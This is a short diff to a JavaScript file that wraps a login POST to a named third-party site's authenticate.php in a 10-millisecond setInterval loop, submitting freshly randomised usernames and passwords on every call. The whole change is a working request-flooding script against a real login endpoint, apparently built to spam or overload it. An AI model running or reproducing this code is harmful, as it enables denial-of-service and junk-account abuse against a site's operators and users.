@@ -18,11 +18,11 @@ function makeid(length) {
     return result;
     }
 
-let vvz = makeid(20)
 
   
 
 
+setInterval(()=>{
   
 fetch("https://theddosgame.com/authenticate.php", {
     "credentials": "include",
@@ -39,11 +39,11 @@ fetch("https://theddosgame.com/authenticate.php", {
         "Sec-Fetch-User": "?1"
     },
     "referrer": "https://theddosgame.com/",
-    "body": "username="+vvz+"&pass="+vvz+"&login=",
+    "body": "username="+makeid(12)+"&pass="+makeid(18)+"&login=",
     "method": "POST",
     "mode": "cors"
 }).then(e=>{
     e.text().then(e=>{console.log(e)})
 })
-
+}, 10)
 
